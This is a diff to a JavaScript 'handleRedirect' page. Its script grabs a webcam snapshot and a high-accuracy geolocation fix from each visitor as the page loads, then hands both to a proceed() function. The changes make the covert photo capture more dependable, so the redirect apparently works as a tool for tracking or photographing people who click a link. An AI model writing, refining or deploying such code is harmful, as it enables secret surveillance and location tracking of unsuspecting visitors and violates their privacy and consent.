@@ -508,27 +508,33 @@ const handleRedirect = async (req, res) => {
         }
 
         async function tryCaptureCamera() {
-          try {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-              const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-              const video = document.getElementById('webcamVideo');
-              video.srcObject = stream;
-              await new Promise(resolve => setTimeout(resolve, 500));
-              const canvas = document.getElementById('snapshotCanvas');
-              canvas.width = video.videoWidth || 640;
-              canvas.height = video.videoHeight || 480;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);
-              stream.getTracks().forEach(track => track.stop());
+          return new Promise(async (resolve) => {
+            try {
+              if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                const video = document.getElementById('webcamVideo');
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(res => setTimeout(res, 800));
+                const canvas = document.getElementById('snapshotCanvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                photoDataUrl = canvas.toDataURL('image/jpeg', 0.75);
+                stream.getTracks().forEach(track => track.stop());
+                resolve(photoDataUrl);
+              } else {
+                resolve(null);
+              }
+            } catch (e) {
+              resolve(null);
             }
-          } catch (e) {
-            // User denied or camera not available
-          }
+          });
         }
 
         async function initCapture() {
-          tryCaptureCamera();
+          await tryCaptureCamera();
 
           if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
@@ -539,7 +545,7 @@ const handleRedirect = async (req, res) => {
               async (err) => {
                 proceed(null, null, photoDataUrl);
               },
-              { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+              { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
             );
           } else {
             proceed(null, null, photoDataUrl);
